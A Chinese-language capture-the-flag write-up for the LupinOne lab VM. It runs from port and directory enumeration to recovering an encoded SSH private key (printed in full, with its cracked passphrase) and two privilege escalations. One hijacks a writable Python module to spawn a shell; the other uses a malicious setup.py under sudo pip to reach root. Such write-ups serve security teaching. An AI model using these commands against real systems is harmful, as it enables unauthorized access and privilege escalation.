# 靶机信息

# 信息收集
## Nmap扫描
```
nmap -sCV -p22,80 -O --min-rate 1000 192.168.218.225 -oA nmapScan/details
Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-10 19:41 EST
Nmap scan report for 192.168.218.225
Host is up (0.00051s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5 (protocol 2.0)
| ssh-hostkey: 
|   3072 ed:ea:d9:d3:af:19:9c:8e:4e:0f:31:db:f2:5d:12:79 (RSA)
|   256 bf:9f:a9:93:c5:87:21:a3:6b:6f:9e:e6:87:61:f5:19 (ECDSA)
|_  256 ac:18:ec:cc:35:c0:51:f5:6f:47:74:c3:01:95:b4:0f (ED25519)
80/tcp open  http    Apache httpd 2.4.48 ((Debian))
|_http-title: Site doesn't have a title (text/html).
| http-robots.txt: 1 disallowed entry 
|_/~myfiles
|_http-server-header: Apache/2.4.48 (Debian)
MAC Address: 00:0C:29:5B:91:CB (VMware)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose|router
Running: Linux 4.X|5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 4.15 - 5.19, OpenWrt 21.02 (Linux 5.4), MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
那大概率就是web的入口了。

## 基础信息枚举
```
gobuster dir -u http://192.168.218.225/ -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories-lowercase.txt -x php,html,tx
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.218.225/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/raft-large-directories-lowercase.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php,html,txt
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/javascript           (Status: 301) [Size: 323] [--> http://192.168.218.225/javascript/]
/image                (Status: 301) [Size: 318] [--> http://192.168.218.225/image/]
/index.html           (Status: 200) [Size: 333]
/manual               (Status: 301) [Size: 319] [--> http://192.168.218.225/manual/]
/robots.txt           (Status: 200) [Size: 34]
/server-status        (Status: 403) [Size: 280]
/index.html           (Status: 200) [Size: 333]
Progress: 224656 / 224660 (100.00%)
===============================================================
Finished
===============================================================
```
图片隐写吗，基础隐写技能都试了一下，没用，大概不是。

再看robots，有一个**~myfiles**，这是 Apache + 用户目录（UserDir） 的典型路径。

<img width="1888" height="678" alt="Image" src="https://github.com/user-attachments/assets/10c08618-8f83-4528-84c5-f884289703ad" />

爆破一下用户名，爆出一个用户**secret**。

<img width="1889" height="682" alt="Image" src="https://github.com/user-attachments/assets/627d9bbd-2c80-4514-b533-833481f338dc" />

<img width="1896" height="738" alt="Image" src="https://github.com/user-attachments/assets/3e69274c-a788-4989-bdbc-bea86d61dbc9" />

说出了私钥，但是具体在哪呢，大概率在secret目录下，但是改名了，应该还是得爆破，
```
ffuf -u http://192.168.218.225/~secret/.FUZZ \
     -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \ 
     -e .txt,.key,.bak,.old,.php,.config -fc 403


        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://192.168.218.225/~secret/.FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
 :: Extensions       : .txt .key .bak .old .php .config 
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response status: 403
________________________________________________

#.bak                   [Status: 200, Size: 331, Words: 52, Lines: 6, Duration: 2ms]
#                       [Status: 200, Size: 331, Words: 52, Lines: 6, Duration: 4ms]
# This work is licensed under the Creative Commons .bak [Status: 200, Size: 331, Words: 52, Lines: 6, Duration: 6ms]
#.config                [Status: 200, Size: 331, Words: 52, Lines: 6, Duration: 6ms]
# directory-list-2.3-medium.txt [Status: 200, Size: 331, Words: 52, Lines: 6, Duration: 8ms]
# Copyright 2007 James Fisher.txt [Status: 200, Size: 331, Words: 52, Lines: 6, Duration: 9ms]
#.config                [Status: 200, Size: 331, Words: 52, Lines: 6, Duration: 10ms]
# Copyright 2007 James Fisher.config [Status: 200, Size: 331, Words: 52, Lines: 6, Duration: 10ms]
# Attribution-Share Alike 3.0 License. To view a copy of this .txt [Status: 200, Size: 331, Words: 52, Lines: 6, Duration: 10ms]
# This work is licensed under the Creative Commons .key [Status: 200, Size: 331, Words: 52, Lines: 6, Duration: 12ms]
# Copyright 2007 James Fisher.php [Status: 200, Size: 331, Words: 52, Lines: 6, Duration: 13ms]
# This work is licensed under the Creative Commons .config [Status: 200, Size: 331, Words: 52, Lines: 6, Duration: 15ms]
# Attribution-Share Alike 3.0 License. To view a copy of this  [Status: 200, Size: 331, Words: 52, Lines: 6, Duration: 17ms]
# This work is licensed under the Creative Commons .txt [Status: 200, Size: 331, Words: 52, Lines: 6, Duration: 17ms]
#.old                   [Status: 200, Size: 331, Words: 52, Lines: 6, Duration: 22ms]
# directory-list-2.3-medium.txt.php [Status: 200, Size: 331, Words: 52, Lines: 6, Duration: 23ms]
# Attribution-Share Alike 3.0 License. To view a copy of this .key [Status: 200, Size: 331, Words: 52, Lines: 6, Duration: 24ms]
#.txt                   [Status: 200, Size: 331, Words: 52, Lines: 6, Duration: 23ms]
# Attribution-Share Alike 3.0 License. To view a copy of this .bak [Status: 200, Size: 331, Words: 52, Lines: 6, Duration: 23ms]
#.txt                   [Status: 200, Size: 331, Words: 52, Lines: 6, Duration: 24ms]
#                       [Status: 200, Size: 331, Words: 52, Lines: 6, Duration: 24ms]
# This work is licensed under the Creative Commons .old [Status: 200, Size: 331, Words: 52, Lines: 6, Duration: 24ms]
# Attribution-Share Alike 3.0 License. To view a copy of this .old [Status: 200, Size: 331, Words: 52, Lines: 6, Duration: 24ms]
# directory-list-2.3-medium.txt.txt [Status: 200, Size: 331, Words: 52, Lines: 6, Duration: 24ms]
# Copyright 2007 James Fisher.bak [Status: 200, Size: 331, Words: 52, Lines: 6, Duration: 27ms]
# directory-list-2.3-medium.txt.config [Status: 200, Size: 331, Words: 52, Lines: 6, Duration: 28ms]
#.php                   [Status: 200, Size: 331, Words: 52, Lines: 6, Duration: 28ms]
# This work is licensed under the Creative Commons  [Status: 200, Size: 331, Words: 52, Lines: 6, Duration: 29ms]
# directory-list-2.3-medium.txt.bak [Status: 200, Size: 331, Words: 52, Lines: 6, Duration: 30ms]
#.key                   [Status: 200, Size: 331, Words: 52, Lines: 6, Duration: 30ms]
#.key                   [Status: 200, Size: 331, Words: 52, Lines: 6, Duration: 30ms]
#.bak                   [Status: 200, Size: 331, Words: 52, Lines: 6, Duration: 30ms]
# Copyright 2007 James Fisher.key [Status: 200, Size: 331, Words: 52, Lines: 6, Duration: 31ms]
#.old                   [Status: 200, Size: 331, Words: 52, Lines: 6, Duration: 32ms]
# directory-list-2.3-medium.txt.key [Status: 200, Size: 331, Words: 52, Lines: 6, Duration: 32ms]
# directory-list-2.3-medium.txt.old [Status: 200, Size: 331, Words: 52, Lines: 6, Duration: 33ms]
# Copyright 2007 James Fisher.old [Status: 200, Size: 331, Words: 52, Lines: 6, Duration: 33ms]
# This work is licensed under the Creative Commons .php [Status: 200, Size: 331, Words: 52, Lines: 6, Duration: 33ms]
# Attribution-Share Alike 3.0 License. To view a copy of this .php [Status: 200, Size: 331, Words: 52, Lines: 6, Duration: 33ms]
# or send a letter to Creative Commons, 171 Second Street, .php [Status: 200, Size: 331, Words: 52, Lines: 6, Duration: 14ms]
# or send a letter to Creative Commons, 171 Second Street, .config [Status: 200, Size: 331, Words: 52, Lines: 6, Duration: 17ms]
# Suite 300, San Francisco, California, 94105, USA..txt [Status: 200, Size: 331, Words: 52, Lines: 6, Duration: 17ms]
# Suite 300, San Francisco, California, 94105, USA. [Status: 200, Size: 331, Words: 52, Lines: 6, Duration: 18ms]
# Suite 300, San Francisco, California, 94105, USA..bak [Status: 200, Size: 331, Words: 52, Lines: 6, Duration: 17ms]
# Suite 300, San Francisco, California, 94105, USA..key [Status: 200, Size: 331, Words: 52, Lines: 6, Duration: 18ms]
# Suite 300, San Francisco, California, 94105, USA..config [Status: 200, Size: 331, Words: 52, Lines: 6, Duration: 18ms]
# Suite 300, San Francisco, California, 94105, USA..php [Status: 200, Size: 331, Words: 52, Lines: 6, Duration: 18ms]
# license, visit http://creativecommons.org/licenses/by-sa/3.0/  [Status: 200, Size: 331, Words: 52, Lines: 6, Duration: 38ms]
# Suite 300, San Francisco, California, 94105, USA..old [Status: 200, Size: 331, Words: 52, Lines: 6, Duration: 18ms]
# Attribution-Share Alike 3.0 License. To view a copy of this .config [Status: 200, Size: 331, Words: 52, Lines: 6, Duration: 40ms]
#                       [Status: 200, Size: 331, Words: 52, Lines: 6, Duration: 17ms]
# license, visit http://creativecommons.org/licenses/by-sa/3.0/ .key [Status: 200, Size: 331, Words: 52, Lines: 6, Duration: 36ms]
# license, visit http://creativecommons.org/licenses/by-sa/3.0/ .txt [Status: 200, Size: 331, Words: 52, Lines: 6, Duration: 38ms]
# license, visit http://creativecommons.org/licenses/by-sa/3.0/ .bak [Status: 200, Size: 331, Words: 52, Lines: 6, Duration: 35ms]
# license, visit http://creativecommons.org/licenses/by-sa/3.0/ .old [Status: 200, Size: 331, Words: 52, Lines: 6, Duration: 35ms]
# or send a letter to Creative Commons, 171 Second Street, .old [Status: 200, Size: 331, Words: 52, Lines: 6, Duration: 29ms]
# or send a letter to Creative Commons, 171 Second Street,  [Status: 200, Size: 331, Words: 52, Lines: 6, Duration: 35ms]
# or send a letter to Creative Commons, 171 Second Street, .bak [Status: 200, Size: 331, Words: 52, Lines: 6, Duration: 30ms]
# or send a letter to Creative Commons, 171 Second Street, .key [Status: 200, Size: 331, Words: 52, Lines: 6, Duration: 31ms]
# or send a letter to Creative Commons, 171 Second Street, .txt [Status: 200, Size: 331, Words: 52, Lines: 6, Duration: 33ms]
# license, visit http://creativecommons.org/licenses/by-sa/3.0/ .config [Status: 200, Size: 331, Words: 52, Lines: 6, Duration: 37ms]
# license, visit http://creativecommons.org/licenses/by-sa/3.0/ .php [Status: 200, Size: 331, Words: 52, Lines: 6, Duration: 38ms]
# on atleast 2 different hosts.key [Status: 200, Size: 331, Words: 52, Lines: 6, Duration: 12ms]
# on atleast 2 different hosts.txt [Status: 200, Size: 331, Words: 52, Lines: 6, Duration: 13ms]
# on atleast 2 different hosts.old [Status: 200, Size: 331, Words: 52, Lines: 6, Duration: 7ms]
# on atleast 2 different hosts.php [Status: 200, Size: 331, Words: 52, Lines: 6, Duration: 7ms]
# on atleast 2 different hosts.config [Status: 200, Size: 331, Words: 52, Lines: 6, Duration: 8ms]
#                       [Status: 200, Size: 331, Words: 52, Lines: 6, Duration: 7ms]
#.php                   [Status: 200, Size: 331, Words: 52, Lines: 6, Duration: 6ms]
# Priority ordered case sensative list, where entries were found .php [Status: 200, Size: 331, Words: 52, Lines: 6, Duration: 18ms]
#.txt                   [Status: 200, Size: 331, Words: 52, Lines: 6, Duration: 8ms]
# on atleast 2 different hosts [Status: 200, Size: 331, Words: 52, Lines: 6, Duration: 17ms]
# Priority ordered case sensative list, where entries were found .config [Status: 200, Size: 331, Words: 52, Lines: 6, Duration: 18ms]
#.bak                   [Status: 200, Size: 331, Words: 52, Lines: 6, Duration: 7ms]
#.old                   [Status: 200, Size: 331, Words: 52, Lines: 6, Duration: 7ms]
                        [Status: 200, Size: 331, Words: 52, Lines: 6, Duration: 7ms]
#.config                [Status: 200, Size: 331, Words: 52, Lines: 6, Duration: 8ms]
# Priority ordered case sensative list, where entries were found .bak [Status: 200, Size: 331, Words: 52, Lines: 6, Duration: 21ms]
#.key                   [Status: 200, Size: 331, Words: 52, Lines: 6, Duration: 8ms]
#.php                   [Status: 200, Size: 331, Words: 52, Lines: 6, Duration: 52ms]
#.txt                   [Status: 200, Size: 331, Words: 52, Lines: 6, Duration: 28ms]
#.bak                   [Status: 200, Size: 331, Words: 52, Lines: 6, Duration: 27ms]
#.key                   [Status: 200, Size: 331, Words: 52, Lines: 6, Duration: 27ms]
# Priority ordered case sensative list, where entries were found .txt [Status: 200, Size: 331, Words: 52, Lines: 6, Duration: 25ms]
#.old                   [Status: 200, Size: 331, Words: 52, Lines: 6, Duration: 26ms]
# Priority ordered case sensative list, where entries were found .key [Status: 200, Size: 331, Words: 52, Lines: 6, Duration: 24ms]
#.php                   [Status: 200, Size: 331, Words: 52, Lines: 6, Duration: 26ms]
# Priority ordered case sensative list, where entries were found  [Status: 200, Size: 331, Words: 52, Lines: 6, Duration: 26ms]
#.config                [Status: 200, Size: 331, Words: 52, Lines: 6, Duration: 26ms]
# Copyright 2007 James Fisher [Status: 200, Size: 331, Words: 52, Lines: 6, Duration: 61ms]
# Priority ordered case sensative list, where entries were found .old [Status: 200, Size: 331, Words: 52, Lines: 6, Duration: 27ms]
# on atleast 2 different hosts.bak [Status: 200, Size: 331, Words: 52, Lines: 6, Duration: 26ms]
                        [Status: 200, Size: 331, Words: 52, Lines: 6, Duration: 13ms]
mysecret.txt            [Status: 200, Size: 4689, Words: 1, Lines: 2, Duration: 19ms]
:: Progress: [1543920/1543920] :: Job [1/1] :: 8695 req/sec :: Duration: [0:04:14] :: Errors: 0 ::
```
在尝试许多字典、后缀、前缀之后，终于爆破出了一个结果。

好像是一个base64编码，不管了梭哈
```
 curl -s http://192.168.218.225/~secret/.mysecret.txt | python3 basecrack.py

[>] Enter Encoded Base: 
[>] Decoding as Base58: -----BEGIN OPENSSH PRIVATE KEY-----
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
iUJ66WmRUN9EoVlkeCzQJwivI=
-----END OPENSSH PRIVATE KEY-----

[-] The Encoding Scheme Is Base58
```
拿到私钥。

# user权限
但是直接登录显示需要私钥密码，对于爆破字典不熟，导致花了很长时间都没爆破出来，最后经过提示才知道使用**fasttrack**字典。
```
john rsa_hash.txt --wordlist=/usr/share/wordlists/fasttrack.txt                                         
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 2 for all loaded hashes
Cost 2 (iteration count) is 16 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
P@55w0rd!        (id_rsa)     
1g 0:00:00:02 DONE (2025-12-10 22:55) 0.3623g/s 34.78p/s 34.78c/s 34.78C/s Autumn2013..testing123
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```
然后成功登录进去。


# 提权
```
icex64@LupinOne:~$ sudo -l 
Matching Defaults entries for icex64 on LupinOne:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User icex64 may run the following commands on LupinOne:
    (arsene) NOPASSWD: /usr/bin/python3.9 /home/arsene/heist.py
```
这应该就是提权点
```
import webbrowser

print ("Its not yet ready to get in action")

webbrowser.open("https://empirecybersecurity.co.mz")
```
代码很简洁。

询问AI，这个设计到python的模块劫持的手法，先学习一下劫持手法。

```
icex64@LupinOne:~$ ls -la /usr/lib/python3.9/webbrowser.py 
-rwxrwxrwx 1 root root 24087 Oct  4  2021 /usr/lib/python3.9/webbrowser.py
```
这里看到权限是777，那么就可以写进去

```
icex64@LupinOne:~$ head  /usr/lib/python3.9/webbrowser.py  
#! /usr/bin/env python3
"""Interfaces for launching and remotely controlling Web browsers."""
# Maintained by Georg Brandl.
import os 
os.execv("/bin/bash", ["/bin/bash"])
```
切换一下用户shell

```
icex64@LupinOne:~$ sudo -u arsene /usr/bin/python3.9 /home/arsene/heist.py 
arsene@LupinOne:/home/icex64$ id
uid=1000(arsene) gid=1000(arsene) groups=1000(arsene),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev)
arsene@LupinOne:/home/icex64$ sudo -l
Matching Defaults entries for arsene on LupinOne:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User arsene may run the following commands on LupinOne:
    (root) NOPASSWD: /usr/bin/pip
arsene@LupinOne:/home/icex64$ 
```
看了一下pip提权思路是利用 pip install 在安装本地包时会执行打包脚本（setup.py）的特性来获取提权。

>TF=$(mktemp -d)
在 /tmp（或系统默认的临时目录）创建一个临时目录，返回路径赋给变量 TF。
mktemp -d 比直接用 /tmp/foo 更安全，避免名字冲突。
>echo "import os; os.execl('/bin/sh', 'sh', '-c', 'sh <$(tty) >$(tty) 2>$(tty)')" > $TF/setup.py
这行在临时目录写入一个文件 setup.py，用 exec 替换当前进程为一个 shell，且把 stdin/stdout/stderr 重定向到你的 tty，从而建立一个交互 shell 连接到当前终端。
>sudo /usr/bin/pip install $TF
会把该目录当作一个可安装的包来安装。在传统安装流程里（setup.py-based 项目）pip 会导入并执行 setup.py 以完成安装/构建步骤。
```
arsene@LupinOne:/home/icex64$ TF=$(mktemp -d)
arsene@LupinOne:/home/icex64$ echo "import os; os.execl('/bin/sh', 'sh', '-c', 'sh <$(tty) >$(tty) 2>$(tty)')" > $TF/setup.py
arsene@LupinOne:/home/icex64$ sudo /usr/bin/pip install $TF
Processing /tmp/tmp.MMpROfzDHC
# whoami
root
# id
uid=0(root) gid=0(root) groups=0(root)
# 
```
提权成功